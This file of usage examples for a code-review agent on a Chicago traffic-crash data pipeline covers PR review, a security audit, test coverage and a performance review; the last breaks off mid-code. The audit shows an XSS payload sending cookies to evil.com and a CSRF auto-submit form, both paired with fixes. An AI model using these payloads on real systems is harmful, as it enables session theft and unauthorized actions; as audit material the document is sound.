# Code Reviewer Agent - Usage Examples

This document provides real-world examples of using the **Code Reviewer Agent** for the Chicago Traffic Crash Data Pipeline project.

---

## Example 1: Review Pull Request with New API Endpoint

### User Request
> "Can you review this PR that adds a new endpoint for searching crashes by street name?"

### Agent Workflow

**Step 1: Read the PR changes**
```bash
# Agent examines the changed files
git diff main feature/search-by-street

# Files modified:
# - src/api/routers/crashes.py (new endpoint)
# - src/services/crash_service.py (new service method)
# - tests/test_api_endpoints.py (new tests)
```

**Step 2: Check test coverage**
```python
# src/api/routers/crashes.py (CHANGES)
@router.get("/crashes/search/street")
async def search_by_street(
    street_name: str,
    limit: int = 100,
    offset: int = 0,
    db: Session = Depends(get_db)
):
    """Search crashes by street name."""
    crashes = db.query(Crash).filter(
        Crash.street_name.ilike(f"%{street_name}%")
    ).offset(offset).limit(limit).all()
    return crashes
```

```python
# tests/test_api_endpoints.py (CHANGES)
def test_search_by_street_valid():
    response = client.get("/crashes/search/street?street_name=MICHIGAN")
    assert response.status_code == 200
    assert len(response.json()) > 0
```

**Step 3: Agent's comprehensive review**

```markdown
## Code Review: Search Crashes by Street Name

### Summary
This PR adds a new endpoint `/crashes/search/street` to search crashes by street name. The implementation has several issues that must be addressed before merging.

---

### ❌ Critical Issues (Must Fix)

#### 1. Missing Response Model (src/api/routers/crashes.py:45)
**Issue**: Endpoint has no `response_model` specified, breaking API documentation and type safety.

**Current**:
\`\`\`python
@router.get("/crashes/search/street")
async def search_by_street(...):
    return crashes  # Returns raw SQLAlchemy objects
\`\`\`

**Fix**:
\`\`\`python
from src.api.models import CrashResponse

@router.get("/crashes/search/street", response_model=List[CrashResponse])
async def search_by_street(...) -> List[CrashResponse]:
    return crashes
\`\`\`

**Why**: Without a response model:
- API docs won't show response schema
- No data validation/serialization
- Circular reference issues with SQLAlchemy relationships

---

#### 2. Missing Request Validation (src/api/routers/crashes.py:47)
**Issue**: Query parameters not validated with Pydantic.

**Current**:
\`\`\`python
async def search_by_street(
    street_name: str,
    limit: int = 100,
    offset: int = 0,
    ...
\`\`\`

**Fix**: Create a Pydantic model
\`\`\`python
class StreetSearchRequest(BaseModel):
    street_name: str = Field(..., min_length=1, max_length=100, description="Street name to search")
    limit: int = Field(default=100, ge=1, le=1000, description="Max results")
    offset: int = Field(default=0, ge=0, description="Results offset for pagination")

@router.get("/crashes/search/street", response_model=List[CrashResponse])
async def search_by_street(
    params: StreetSearchRequest = Depends(),
    db: Session = Depends(get_db)
) -> List[CrashResponse]:
    crashes = db.query(Crash).filter(
        Crash.street_name.ilike(f"%{params.street_name}%")
    ).offset(params.offset).limit(params.limit).all()
    return crashes
\`\`\`

**Why**: Validation prevents:
- Empty string searches
- Negative offsets
- Excessive limits (DoS risk)

---

#### 3. Missing Type Hints (src/api/routers/crashes.py:45)
**Issue**: Function signature missing return type annotation.

**Current**:
\`\`\`python
async def search_by_street(...):  # No return type
\`\`\`

**Fix**:
\`\`\`python
async def search_by_street(...) -> List[CrashResponse]:
\`\`\`

**Validation**: Run `mypy src/api/routers/crashes.py`

---

#### 4. Missing Docstring Details (src/api/routers/crashes.py:47)
**Issue**: Docstring too brief, missing Args/Returns/Raises.

**Current**:
\`\`\`python
"""Search crashes by street name."""
\`\`\`

**Fix** (Google style):
\`\`\`python
"""Search for traffic crashes by street name.

Performs a case-insensitive partial match on the street_name field.
Results are paginated using limit/offset parameters.

Args:
    params: Search parameters (street name, limit, offset)
    db: Database session (injected)

Returns:
    List of crash records matching the street name query.
    Returns empty list if no matches found.

Raises:
    HTTPException: 422 if validation fails
    HTTPException: 500 if database error occurs

Example:
    GET /crashes/search/street?street_name=MICHIGAN&limit=10
"""
\`\`\`

---

### ⚠️ Important Issues (Should Fix)

#### 5. Inefficient Query (src/api/routers/crashes.py:52)
**Issue**: `ilike(f"%{street_name}%")` performs full table scan if street_name starts with wildcard.

**Current Performance**:
- ❌ `%MICH%` - Full table scan (slow for 1M+ records)
- ✅ `MICH%` - Can use index (fast)

**Optimization Suggestions**:

**Option A**: Prefix-only matching (fastest)
\`\`\`python
Crash.street_name.ilike(f"{params.street_name}%")  # No leading wildcard
\`\`\`

**Option B**: Add GIN index for full-text search
\`\`\`sql
-- Migration
CREATE INDEX ix_crashes_street_name_gin ON crashes
USING gin(street_name gin_trgm_ops);
\`\`\`

\`\`\`python
# Then use trigram similarity
from sqlalchemy import func
db.query(Crash).filter(
    func.similarity(Crash.street_name, params.street_name) > 0.3
).order_by(
    func.similarity(Crash.street_name, params.street_name).desc()
).limit(params.limit).all()
\`\`\`

**Option C**: Add explicit index check
\`\`\`python
# Add index in model
class Crash(Base):
    __table_args__ = (
        Index('ix_crashes_street_name_trgm', 'street_name', postgresql_using='gin'),
    )
\`\`\`

**Performance Test Required**:
\`\`\`bash
EXPLAIN ANALYZE SELECT * FROM crashes WHERE street_name ILIKE '%MICHIGAN%';
# Check for "Seq Scan" vs "Index Scan"
\`\`\`

---

#### 6. Missing Service Layer (Architecture Violation)
**Issue**: Business logic in router instead of service layer.

**Current Architecture**:
\`\`\`
Router (crashes.py) → Database (direct query)
\`\`\`

**Preferred Architecture**:
\`\`\`
Router (crashes.py) → Service (crash_service.py) → Database
\`\`\`

**Fix**: Move query to service
\`\`\`python
# src/services/crash_service.py
class CrashService:
    def __init__(self, session: Session):
        self.session = session

    def search_by_street(
        self,
        street_name: str,
        limit: int = 100,
        offset: int = 0
    ) -> List[Crash]:
        """Search crashes by street name.

        Args:
            street_name: Street name to search (case-insensitive partial match)
            limit: Maximum results to return
            offset: Number of results to skip

        Returns:
            List of Crash model instances
        """
        return self.session.query(Crash).filter(
            Crash.street_name.ilike(f"{street_name}%")
        ).offset(offset).limit(limit).all()
\`\`\`

\`\`\`python
# src/api/routers/crashes.py
from src.services.crash_service import CrashService

def get_crash_service(db: Session = Depends(get_db)) -> CrashService:
    return CrashService(db)

@router.get("/crashes/search/street", response_model=List[CrashResponse])
async def search_by_street(
    params: StreetSearchRequest = Depends(),
    crash_service: CrashService = Depends(get_crash_service)
) -> List[CrashResponse]:
    """Search for traffic crashes by street name."""
    crashes = crash_service.search_by_street(
        street_name=params.street_name,
        limit=params.limit,
        offset=params.offset
    )
    return crashes
\`\`\`

**Why**: Separation of concerns
- Router: HTTP handling only
- Service: Business logic, reusable
- Easier to test service independently

---

### ⚠️ Test Coverage Issues

#### 7. Missing Test Cases (tests/test_api_endpoints.py)
**Current Coverage**: 1 test (only happy path)

**Missing Test Cases**:

\`\`\`python
# Test validation errors
def test_search_by_street_empty_name():
    """Should reject empty street name."""
    response = client.get("/crashes/search/street?street_name=")
    assert response.status_code == 422

def test_search_by_street_invalid_limit():
    """Should reject limit > 1000."""
    response = client.get("/crashes/search/street?street_name=TEST&limit=5000")
    assert response.status_code == 422

def test_search_by_street_negative_offset():
    """Should reject negative offset."""
    response = client.get("/crashes/search/street?street_name=TEST&offset=-1")
    assert response.status_code == 422

# Test edge cases
def test_search_by_street_no_results():
    """Should return empty list for non-existent street."""
    response = client.get("/crashes/search/street?street_name=NONEXISTENT_STREET_XYZ")
    assert response.status_code == 200
    assert response.json() == []

def test_search_by_street_case_insensitive():
    """Should match regardless of case."""
    response1 = client.get("/crashes/search/street?street_name=michigan")
    response2 = client.get("/crashes/search/street?street_name=MICHIGAN")
    assert response1.json() == response2.json()

# Test pagination
def test_search_by_street_pagination():
    """Should respect limit and offset."""
    response1 = client.get("/crashes/search/street?street_name=STATE&limit=10&offset=0")
    response2 = client.get("/crashes/search/street?street_name=STATE&limit=10&offset=10")

    # Should not overlap
    ids1 = [r['crash_record_id'] for r in response1.json()]
    ids2 = [r['crash_record_id'] for r in response2.json()]
    assert set(ids1).isdisjoint(set(ids2))
\`\`\`

**Coverage Target**: 80%+ for new code
\`\`\`bash
pytest tests/test_api_endpoints.py::test_search_by_street* --cov=src/api/routers/crashes --cov-report=term
\`\`\`

---

### ✅ Good Patterns Observed

1. **Dependency Injection**: Correctly using `Depends(get_db)` for database session
2. **Pagination**: Includes limit/offset for large result sets
3. **Async Endpoint**: Uses `async def` for consistency with other endpoints
4. **Case-Insensitive**: Uses `ilike()` for user-friendly search

---

## Recommendations

### Priority 1 (Must Fix Before Merge)
1. Add `response_model=List[CrashResponse]`
2. Add Pydantic request validation model
3. Add return type hint
4. Expand docstring with Args/Returns/Raises

### Priority 2 (Should Fix Before Merge)
5. Move business logic to `CrashService`
6. Add database index for `street_name` column
7. Add comprehensive test coverage (8+ test cases)

### Priority 3 (Nice to Have)
8. Consider trigram similarity for fuzzy matching
9. Add query performance logging
10. Add OpenAPI example in docstring

---

## Suggested Implementation Timeline

1. **Phase 1** (15 min): Fix critical issues #1-4
2. **Phase 2** (30 min): Refactor to service layer (#6)
3. **Phase 3** (45 min): Add test coverage (#7)
4. **Phase 4** (20 min): Database performance optimization (#5)

**Total Effort**: ~2 hours

---

## Approval Status

**❌ REQUEST CHANGES**

**Blockers**:
- Missing response model
- Missing request validation
- Missing comprehensive tests
- Architecture violation (no service layer)

**Next Steps**:
1. Address Priority 1 and Priority 2 issues
2. Run `make test` to verify tests pass
3. Run `make lint` to verify code quality
4. Request re-review
\`\`\`

---

### Expected Outcome

The developer would:
1. Implement all Priority 1 and Priority 2 fixes
2. Add comprehensive test coverage
3. Verify linting and tests pass
4. Push updated code for re-review
5. Agent would re-review and approve if all issues addressed

**Result**: High-quality, well-tested, performant endpoint following project patterns.

---

## Example 2: Security Audit of Admin Portal

### User Request
> "Can you do a security audit of the admin portal JavaScript code?"

### Agent Workflow

**Step 1: Search for security vulnerabilities**

```bash
# XSS vulnerabilities (innerHTML without escaping)
sg run -l javascript -p 'innerHTML = $_' src/static/admin/app.js

# Unvalidated API responses
sg run -l javascript -p 'response.json()' src/static/admin/app.js | grep -v 'try'

# Hardcoded credentials
grep -r "password\|api_key\|secret" src/static/admin/

# CORS configuration
grep -A 10 "CORSMiddleware" src/api/main.py
```

**Step 2: Analyze findings**

### Security Audit Report

```markdown
## Admin Portal Security Audit

**Audit Date**: 2024-12-13
**Scope**: `/src/static/admin/` (HTML, JavaScript, CSS)
**Methodology**: ast-grep pattern matching, manual code review

---

### 🔴 Critical Vulnerabilities

#### 1. XSS Vulnerability in Log Rendering (app.js:789)
**Risk Level**: **HIGH**
**CVSS Score**: 7.3 (High)

**Vulnerable Code**:
\`\`\`javascript
function renderExecutionLogs(logs) {
    const logHtml = logs.map(log =>
        `<div class="log-entry">
            <span class="log-level">${log.level}</span>
            <span class="log-message">${log.message}</span>
        </div>`
    ).join('');
    document.getElementById('execution-logs').innerHTML = logHtml;
}
\`\`\`

**Attack Vector**:
\`\`\`javascript
// Malicious log message from compromised backend
{
    "level": "ERROR",
    "message": "<img src=x onerror='fetch(\"https://evil.com?cookie=\"+document.cookie)'>"
}
// Result: Sends session cookies to attacker
\`\`\`

**Fix**:
\`\`\`javascript
function renderExecutionLogs(logs) {
    const logHtml = logs.map(log =>
        `<div class="log-entry">
            <span class="log-level">${escapeHtml(log.level)}</span>
            <span class="log-message">${escapeHtml(log.message)}</span>
        </div>`
    ).join('');
    document.getElementById('execution-logs').innerHTML = logHtml;
}
\`\`\`

**Verification**:
\`\`\`javascript
// Add test case
const maliciousLog = {
    level: "ERROR",
    message: "<script>alert('XSS')</script>"
};
const escaped = escapeHtml(maliciousLog.message);
assert(escaped === "&lt;script&gt;alert('XSS')&lt;/script&gt;");
\`\`\`

---

#### 2. XSS Vulnerability in Job Name Display (app.js:234)
**Risk Level**: **HIGH**

**Vulnerable Code**:
\`\`\`javascript
function displayJobs(jobsList) {
    const html = jobsList.map(job => `
        <tr>
            <td><strong>${job.name}</strong></td>
            ...
        </tr>
    `).join('');
    tbody.innerHTML = html;
}
\`\`\`

**Attack**: Malicious job name with JavaScript
\`\`\`json
{
    "name": "<img src=x onerror='alert(document.cookie)'>",
    ...
}
\`\`\`

**Fix**:
\`\`\`javascript
<td><strong>${escapeHtml(job.name)}</strong></td>
\`\`\`

---

### ⚠️ Medium Severity Issues

#### 3. CORS Configuration Too Permissive (main.py:82)
**Risk Level**: **MEDIUM**

**Current Configuration**:
\`\`\`python
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],  # ⚠️ Allows any origin
    allow_credentials=True,  # ⚠️ With credentials!
    allow_methods=["*"],
    allow_headers=["*"],
)
\`\`\`

**Risk**: Allows cross-origin requests from ANY domain with credentials.

**Recommended Fix**:
\`\`\`python
# For development
allowed_origins = [
    "http://localhost:8000",
    "http://127.0.0.1:8000",
]

# For production (add to .env)
if settings.environment == "production":
    allowed_origins = settings.cors_allowed_origins.split(",")

app.add_middleware(
    CORSMiddleware,
    allow_origins=allowed_origins,  # Whitelist only
    allow_credentials=True,
    allow_methods=["GET", "POST", "PUT", "DELETE"],  # Explicit methods
    allow_headers=["Content-Type", "Authorization"],  # Explicit headers
)
\`\`\`

---

#### 4. No CSRF Protection (API-wide)
**Risk Level**: **MEDIUM**

**Issue**: Admin portal makes state-changing requests (POST, PUT, DELETE) without CSRF tokens.

**Current Flow**:
\`\`\`javascript
// No CSRF token
await apiRequest('/jobs/', {
    method: 'POST',
    body: JSON.stringify(jobData)
});
\`\`\`

**Attack Scenario**:
\`\`\`html
<!-- Attacker's website -->
<form action="http://crashes-api.com/jobs/123" method="POST">
    <input type="hidden" name="enabled" value="false">
</form>
<script>document.forms[0].submit();</script>
<!-- If admin visits, their session is used to disable jobs -->
\`\`\`

**Recommended Fix**:

**Option A**: Use SameSite cookies (FastAPI sessions)
\`\`\`python
from fastapi import FastAPI, Response
from starlette.middleware.sessions import SessionMiddleware

app.add_middleware(
    SessionMiddleware,
    secret_key=settings.secret_key,
    same_site="strict",  # Prevents CSRF
    https_only=settings.environment == "production"
)
\`\`\`

**Option B**: Implement CSRF token middleware
\`\`\`python
# Use fastapi-csrf-protect
from fastapi_csrf_protect import CsrfProtect

@app.post("/jobs/")
async def create_job(
    request: CreateJobRequest,
    csrf_protect: CsrfProtect = Depends()
):
    await csrf_protect.validate_csrf(request)
    ...
\`\`\`

---

### ⚠️ Low Severity Issues

#### 5. No Content Security Policy (index.html)
**Risk Level**: **LOW**

**Current**: No CSP headers

**Recommended**:
\`\`\`python
# In FastAPI middleware
from fastapi.middleware.trustedhost import TrustedHostMiddleware

@app.middleware("http")
async def add_security_headers(request, call_next):
    response = await call_next(request)
    response.headers["Content-Security-Policy"] = (
        "default-src 'self'; "
        "script-src 'self' 'unsafe-inline' cdn.jsdelivr.net; "
        "style-src 'self' 'unsafe-inline' fonts.googleapis.com; "
        "font-src 'self' fonts.gstatic.com;"
    )
    response.headers["X-Content-Type-Options"] = "nosniff"
    response.headers["X-Frame-Options"] = "DENY"
    response.headers["X-XSS-Protection"] = "1; mode=block"
    return response
\`\`\`

---

#### 6. No Rate Limiting on API Endpoints
**Risk Level**: **LOW**

**Issue**: No protection against brute-force or DoS attacks.

**Recommended**:
\`\`\`python
from slowapi import Limiter, _rate_limit_exceeded_handler
from slowapi.util import get_remote_address

limiter = Limiter(key_func=get_remote_address)
app.state.limiter = limiter
app.add_exception_handler(RateLimitExceeded, _rate_limit_exceeded_handler)

@app.post("/jobs/")
@limiter.limit("10/minute")  # Max 10 job creations per minute
async def create_job(...):
    ...
\`\`\`

---

### ✅ Good Security Practices Found

1. **`escapeHtml()` function exists** (app.js:1212) - Just not used everywhere
2. **HTTPS in production** - API served over HTTPS
3. **Environment-based config** - Secrets from .env, not hardcoded
4. **SQL ORM usage** - All database queries use SQLAlchemy (no raw SQL)
5. **Input validation** - Pydantic models validate API requests

---

## Remediation Checklist

### Immediate Actions (Within 24 Hours)
- [ ] Fix XSS in `renderExecutionLogs()` (app.js:789)
- [ ] Fix XSS in `displayJobs()` (app.js:234)
- [ ] Search all `innerHTML` assignments and escape: `grep -n "innerHTML =" src/static/admin/app.js`

### Short-Term Actions (Within 1 Week)
- [ ] Restrict CORS to specific origins (main.py:82)
- [ ] Add CSRF protection (FastAPI middleware)
- [ ] Add security headers middleware
- [ ] Add rate limiting to critical endpoints

### Long-Term Actions (Within 1 Month)
- [ ] Implement authentication/authorization
- [ ] Add security audit to CI/CD pipeline
- [ ] Set up SIEM logging for security events
- [ ] Penetration testing

---

## Testing Recommendations

\`\`\`python
# tests/test_security.py

class TestXSSPrevention:
    def test_escapeHtml_prevents_script_injection(self):
        """escapeHtml should neutralize <script> tags."""
        malicious = "<script>alert('XSS')</script>"
        safe = escapeHtml(malicious)
        assert "<script>" not in safe
        assert "&lt;script&gt;" in safe

    def test_escapeHtml_prevents_event_handlers(self):
        """escapeHtml should neutralize event handler attributes."""
        malicious = "<img src=x onerror='alert(1)'>"
        safe = escapeHtml(malicious)
        assert "onerror" not in safe.lower() or "onerror=" not in safe

class TestCSRF:
    def test_state_changing_request_without_token_fails(self):
        """POST/PUT/DELETE without CSRF token should fail."""
        response = client.post("/jobs/", json={...})
        # After CSRF implementation:
        # assert response.status_code == 403

class TestCORS:
    def test_cors_rejects_unauthorized_origin(self):
        """Requests from unauthorized origins should be blocked."""
        response = client.get(
            "/jobs/",
            headers={"Origin": "https://evil.com"}
        )
        # After CORS fix:
        # assert "Access-Control-Allow-Origin" not in response.headers
\`\`\`

---

## Risk Summary

| Severity | Count | Examples |
|----------|-------|----------|
| 🔴 Critical | 2 | XSS in logs, XSS in job names |
| ⚠️ Medium | 2 | Permissive CORS, No CSRF |
| ℹ️ Low | 2 | No CSP, No rate limiting |
| **Total** | **6** | **Must address critical issues immediately** |

---

## Compliance Notes

**OWASP Top 10 (2021)**:
- ✅ A03:2021 - Injection: **PASS** (using ORM)
- ❌ A03:2021 - XSS: **FAIL** (2 critical issues)
- ⚠️ A05:2021 - Security Misconfiguration: **PARTIAL** (CORS issue)
- ⚠️ A07:2021 - Authentication Failures: **PARTIAL** (No rate limiting)

---

## Conclusion

**Overall Risk**: **MEDIUM-HIGH**

**Immediate Priority**: Fix the 2 XSS vulnerabilities before next deployment.

**Next Steps**:
1. Create security fix branch
2. Implement XSS fixes (15 minutes)
3. Add security tests (30 minutes)
4. Restrict CORS (10 minutes)
5. Deploy fixes
6. Schedule follow-up for CSRF and CSP implementation
\`\`\`

### Expected Outcome

The development team would:
1. Immediately patch XSS vulnerabilities
2. Implement CORS restrictions
3. Add security test suite
4. Plan CSRF and CSP implementation
5. Schedule regular security audits

**Result**: Significantly improved security posture of the admin portal.

---

## Example 3: Analyze Test Coverage for SyncService

### User Request
> "Can you analyze the test coverage for the SyncService and suggest improvements?"

### Agent Workflow

**Step 1: Generate coverage report**
```bash
cd /Users/mmclean/dev/python/chicago-crashes-pipeline
source venv/bin/activate
pytest tests/test_sync_service.py -v --cov=src/services/sync_service --cov-report=term --cov-report=html
```

**Step 2: Review coverage report**
```
Name                               Stmts   Miss  Cover   Missing
----------------------------------------------------------------
src/services/sync_service.py         156     42    73%   89-95, 112-120, 145-167
----------------------------------------------------------------
```

**Step 3: Analyze uncovered code**

```markdown
## Test Coverage Analysis: SyncService

**Current Coverage**: 73% (156 statements, 42 missing)
**Target Coverage**: 85%+
**Gap**: 12 percentage points (~20 statements)

---

### Uncovered Code Paths

#### 1. Error Handling in Batch Processing (Lines 89-95)
**Missing Coverage**: Exception handling when sanitizer fails

**Uncovered Code**:
\`\`\`python
try:
    sanitized = self.sanitizer.sanitize_crash_record(record)
except Exception as e:
    logger.error("Sanitization failed", record_id=record.get('crash_record_id'), error=str(e))
    endpoint_result.records_skipped += 1
    continue  # ← Not tested
\`\`\`

**Suggested Test**:
\`\`\`python
@pytest.mark.asyncio
async def test_sync_handles_sanitization_errors(mocker):
    """SyncService should skip records that fail sanitization."""
    # Mock sanitizer to raise exception on specific record
    mock_sanitizer = mocker.Mock()
    mock_sanitizer.sanitize_crash_record.side_effect = [
        {"crash_record_id": "VALID_001", ...},  # First record OK
        ValueError("Invalid date format"),       # Second record fails
        {"crash_record_id": "VALID_003", ...},  # Third record OK
    ]

    sync_service = SyncService(sanitizer=mock_sanitizer, ...)
    result = await sync_service.sync(endpoints=["crashes"])

    # Should skip failed record but continue processing
    assert result.endpoint_results["crashes"].records_skipped == 1
    assert result.endpoint_results["crashes"].records_processed == 2
\`\`\`

---

#### 2. Batch Callback Functionality (Lines 112-120)
**Missing Coverage**: Optional callback invocation after each batch

**Uncovered Code**:
\`\`\`python
if batch_callback:  # ← Branch not tested
    batch_callback(endpoint_result)
\`\`\`

**Suggested Test**:
\`\`\`python
@pytest.mark.asyncio
async def test_sync_invokes_batch_callback(mocker):
    """SyncService should invoke callback after each batch if provided."""
    callback_spy = mocker.Mock()

    sync_service = SyncService(...)
    await sync_service.sync(
        endpoints=["crashes"],
        batch_callback=callback_spy  # Provide callback
    )

    # Callback should be invoked once per batch
    assert callback_spy.call_count > 0

    # Verify callback received EndpointSyncResult
    call_args = callback_spy.call_args[0][0]
    assert isinstance(call_args, EndpointSyncResult)
    assert call_args.endpoint == "crashes"
\`\`\`

---

#### 3. Empty Batch Handling (Lines 145-150)
**Missing Coverage**: What happens when API returns empty batch

**Uncovered Code**:
\`\`\`python
async for batch in client.iter_batches(...):
    if not batch:  # ← Not tested
        logger.warning("Empty batch received", endpoint=endpoint)
        break
\`\`\`

**Suggested Test**:
\`\`\`python
@pytest.mark.asyncio
async def test_sync_handles_empty_batches(mocker):
    """SyncService should handle empty batches gracefully."""
    mock_client = mocker.AsyncMock()

    # First batch has data, second batch is empty
    async def mock_iter_batches(*args, **kwargs):
        yield [{"crash_record_id": "TEST001", ...}]
        yield []  # Empty batch

    mock_client.iter_batches = mock_iter_batches

    sync_service = SyncService(client_factory=lambda: mock_client, ...)
    result = await sync_service.sync(endpoints=["crashes"])

    assert result.endpoint_results["crashes"].records_fetched == 1
    assert result.endpoint_results["crashes"].status == "completed"
\`\`\`

---

#### 4. Date Range Filtering (Lines 155-167)
**Missing Coverage**: start_date/end_date parameter handling

**Uncovered Code**:
\`\`\`python
if start_date:  # ← Not tested
    where_clause = f"crash_date >= '{start_date}'"
if end_date:  # ← Not tested
    where_clause += f" AND crash_date <= '{end_date}'"
\`\`\`

**Suggested Tests**:
\`\`\`python
@pytest.mark.asyncio
async def test_sync_with_start_date_filter(mocker):
    """SyncService should filter records by start_date."""
    mock_client = mocker.AsyncMock()

    sync_service = SyncService(client_factory=lambda: mock_client, ...)
    await sync_service.sync(
        endpoints=["crashes"],
        start_date="2024-01-01"
    )

    # Verify client was called with where clause
    call_kwargs = mock_client.iter_batches.call_args[1]
    assert "crash_date >= '2024-01-01'" in call_kwargs['where_clause']

@pytest.mark.asyncio
async def test_sync_with_date_range_filter(mocker):
    """SyncService should filter records by date range."""
    mock_client = mocker.AsyncMock()

    sync_service = SyncService(client_factory=lambda: mock_client, ...)
    await sync_service.sync(
        endpoints=["crashes"],
        start_date="2024-01-01",
        end_date="2024-01-31"
    )

    call_kwargs = mock_client.iter_batches.call_args[1]
    where_clause = call_kwargs['where_clause']
    assert "crash_date >= '2024-01-01'" in where_clause
    assert "crash_date <= '2024-01-31'" in where_clause
\`\`\`

---

#### 5. Multiple Endpoint Sync (Lines 78-85)
**Missing Coverage**: Syncing multiple endpoints in sequence

**Uncovered Code**:
\`\`\`python
for endpoint in endpoints:  # ← Only tested with single endpoint
    endpoint_result = await self._sync_single_endpoint(...)
    sync_result.endpoint_results[endpoint] = endpoint_result
\`\`\`

**Suggested Test**:
\`\`\`python
@pytest.mark.asyncio
async def test_sync_multiple_endpoints(mocker):
    """SyncService should sync multiple endpoints sequentially."""
    mock_client = mocker.AsyncMock()

    sync_service = SyncService(client_factory=lambda: mock_client, ...)
    result = await sync_service.sync(
        endpoints=["crashes", "people", "vehicles"]  # Multiple endpoints
    )

    # Should have results for all endpoints
    assert "crashes" in result.endpoint_results
    assert "people" in result.endpoint_results
    assert "vehicles" in result.endpoint_results

    # Client should be called 3 times
    assert mock_client.iter_batches.call_count == 3
\`\`\`

---

### New Fixtures Needed

Add to `tests/conftest.py`:

\`\`\`python
@pytest.fixture
def mock_soda_client(mocker):
    """Mock SODAClient for testing SyncService."""
    client = mocker.AsyncMock()

    async def default_iter_batches(*args, **kwargs):
        yield [
            {"crash_record_id": "TEST001", "crash_date": "2024-01-01T10:00:00"},
            {"crash_record_id": "TEST002", "crash_date": "2024-01-02T11:00:00"},
        ]

    client.iter_batches = default_iter_batches
    return client

@pytest.fixture
def mock_data_sanitizer(mocker):
    """Mock DataSanitizer for testing SyncService."""
    sanitizer = mocker.Mock()
    sanitizer.sanitize_crash_record.side_effect = lambda r: r  # Pass-through
    return sanitizer

@pytest.fixture
def mock_database_service(mocker):
    """Mock DatabaseService for testing SyncService."""
    service = mocker.Mock()
    service.upsert_crash_records.return_value = {
        "inserted": 1,
        "updated": 1,
        "skipped": 0
    }
    return service

@pytest.fixture
def sync_service(mock_soda_client, mock_data_sanitizer, mock_database_service):
    """SyncService with mocked dependencies."""
    return SyncService(
        batch_size=50000,
        sanitizer=mock_data_sanitizer,
        database_service=mock_database_service,
        client_factory=lambda: mock_soda_client
    )
\`\`\`

---

### Coverage Improvement Plan

**Phase 1**: Error Handling Tests (Effort: 30 min)
- Test sanitization errors (1 test)
- Test empty batches (1 test)
- **Expected Coverage**: +5% → 78%

**Phase 2**: Feature Tests (Effort: 45 min)
- Test batch callbacks (1 test)
- Test date range filtering (2 tests)
- Test multiple endpoints (1 test)
- **Expected Coverage**: +7% → 85%

**Phase 3**: Edge Cases (Effort: 30 min)
- Test network errors during sync
- Test database errors during upsert
- Test interruption/cancellation
- **Expected Coverage**: +3% → 88%

**Total Effort**: ~2 hours
**Expected Final Coverage**: 88%

---

### Recommended Test Structure

\`\`\`python
# tests/test_sync_service.py

class TestSyncServiceBasics:
    """Test basic sync functionality."""

    @pytest.mark.asyncio
    async def test_sync_single_endpoint(sync_service):
        """Should sync a single endpoint successfully."""
        ...

    @pytest.mark.asyncio
    async def test_sync_multiple_endpoints(sync_service):
        """Should sync multiple endpoints sequentially."""
        ...

class TestSyncServiceErrorHandling:
    """Test error handling in sync process."""

    @pytest.mark.asyncio
    async def test_sync_handles_sanitization_errors(mocker):
        """Should skip records that fail sanitization."""
        ...

    @pytest.mark.asyncio
    async def test_sync_handles_database_errors(mocker):
        """Should record database errors in result."""
        ...

class TestSyncServiceFiltering:
    """Test date range filtering."""

    @pytest.mark.asyncio
    async def test_sync_with_start_date_filter(mocker):
        """Should filter records by start_date."""
        ...

    @pytest.mark.asyncio
    async def test_sync_with_date_range_filter(mocker):
        """Should filter records by date range."""
        ...

class TestSyncServiceCallbacks:
    """Test batch callback functionality."""

    @pytest.mark.asyncio
    async def test_sync_invokes_batch_callback(mocker):
        """Should invoke callback after each batch if provided."""
        ...
\`\`\`

---

## Summary

**Current State**:
- 73% coverage
- Missing tests for error handling, callbacks, filtering
- No fixtures for SyncService dependencies

**After Implementation**:
- 88% coverage
- Comprehensive error handling tests
- Reusable fixtures for all sync tests
- Clear test organization by feature

**Benefits**:
- Higher confidence in sync reliability
- Easier to debug issues
- Better documentation through tests
- Regression prevention
\`\`\`

### Expected Outcome

The developer would:
1. Add the suggested fixtures to `conftest.py`
2. Implement the 8+ new test cases
3. Run coverage report to verify 85%+ coverage
4. Address any remaining gaps

**Result**: Robust, well-tested SyncService with comprehensive coverage.

---

## Example 4: Performance Review of Database Upsert Operations

### User Request
> "The crash data sync is taking too long. Can you review the database upsert operations for performance issues?"

### Agent Workflow

**Step 1: Profile current performance**
```bash
# Enable SQLAlchemy query logging
# In config: DatabaseSettings(echo=True)

# Run sync with timing
time python -m src.cli.pipeline sync --endpoint crashes --limit 10000
```

**Step 2: Analyze database queries**
```sql
-- In PostgreSQL
SELECT query, calls, total_time, mean_time
FROM pg_stat_statements
WHERE query LIKE '%crashes%'
ORDER BY total_time DESC
LIMIT 10;
```

**Step 3: Review code patterns**

```markdown
## Performance Review: Database Upsert Operations

**Context**: Crash data sync taking 45 minutes for 50,000 records
**Expected**: Should complete in <10 minutes
**Performance Gap**: 4.5x slower than target

---

### Performance Analysis

#### Current Implementation (src/services/database_service.py)

\`\`\`python
def upsert_crash_records(self, records: Sequence[Dict[str, Any]]) -> Dict[str, int]:
    """Upsert crash records."""
    session = self.session_factory()
    inserted, updated, skipped = 0, 0, 0

    try:
        for record in records:  # ⚠️ ISSUE: Row-by-row processing
            prepared = self._prepare_crash_record(record)
            if not prepared:
                skipped += 1
                continue

            pk = prepared['crash_record_id']
            existing = session.get(Crash, pk)  # ⚠️ ISSUE: N queries for existence check

            if existing:
                self._update_fields(existing, prepared)
                updated += 1
            else:
                session.add(Crash(**prepared))
                inserted += 1

        session.commit()  # ⚠️ ISSUE: Single large transaction
    except SQLAlchemyError as exc:
        session.rollback()
        raise
    finally:
        session.close()

    return {"inserted": inserted, "updated": updated, "skipped": skipped}
\`\`\`

**Performance Issues Identified**:

1. **N+1 Query Problem**: `session.get(Crash, pk)` executes 50,000 separate SELECT queries
2. **Large Transaction**: Single commit for all 50,000 records (blocks other operations)
3. **No Bulk Operations**: Not using SQLAlchemy bulk insert/update
4. **No Batch Commits**: Commits all records at once (memory pressure)

**Performance Metrics**:
\`\`\`
50,000 records × (1 SELECT + 1 INSERT/UPDATE) = 100,000 queries
Average query time: 2ms
Total time: 100,000 × 2ms = 200 seconds (3.3 minutes) JUST for queries
Plus: Network latency, Python overhead, transaction logging
Total: ~45 minutes
\`\`\`

---

### Optimization Strategy 1: Batch Existence Check

**Current** (N queries):
\`\`\`python
for record in records:
    existing = session.get(Crash, pk)  # 1 query per record
\`\`\`

**Optimized** (1 query total):
\`\`\`python
def upsert_crash_records(self, records: Sequence[Dict[str, Any]]) -> Dict[str, int]:
    session = self.session_factory()
    inserted, updated, skipped = 0, 0, 0

    try:
        # Prepare all records first
        prepared_records = []
        for record in records:
